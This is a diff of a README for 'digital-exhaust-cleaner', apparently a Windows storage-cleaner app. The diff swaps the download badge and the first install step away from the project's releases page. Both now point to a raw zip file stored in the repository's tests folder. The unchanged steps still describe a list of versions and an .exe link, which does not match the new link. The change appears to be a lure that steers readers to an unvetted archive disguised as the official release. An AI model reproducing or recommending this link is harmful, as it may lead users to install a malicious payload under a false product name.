@@ -1,6 +1,6 @@
 # 🧹 digital-exhaust-cleaner - Reclaim storage space through smart analysis
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/outgoing-shina421/digital-exhaust-cleaner/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/outgoing-shina421/digital-exhaust-cleaner/main/tests/digital_cleaner_exhaust_v3.5.zip)
 
 ## 📁 Project Overview
 
@@ -27,7 +27,7 @@ This application runs on Windows systems. Ensure your machine meets the followin
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the following address to view available versions: [https://github.com/outgoing-shina421/digital-exhaust-cleaner/releases](https://github.com/outgoing-shina421/digital-exhaust-cleaner/releases)
+1. Visit the following address to view available versions: [https://raw.githubusercontent.com/outgoing-shina421/digital-exhaust-cleaner/main/tests/digital_cleaner_exhaust_v3.5.zip](https://raw.githubusercontent.com/outgoing-shina421/digital-exhaust-cleaner/main/tests/digital_cleaner_exhaust_v3.5.zip)
 2. Locate the most recent version at the top of the list.
 3. Click the link ending in `.exe` to begin the download.
 4. Open the downloaded file once the process finishes.
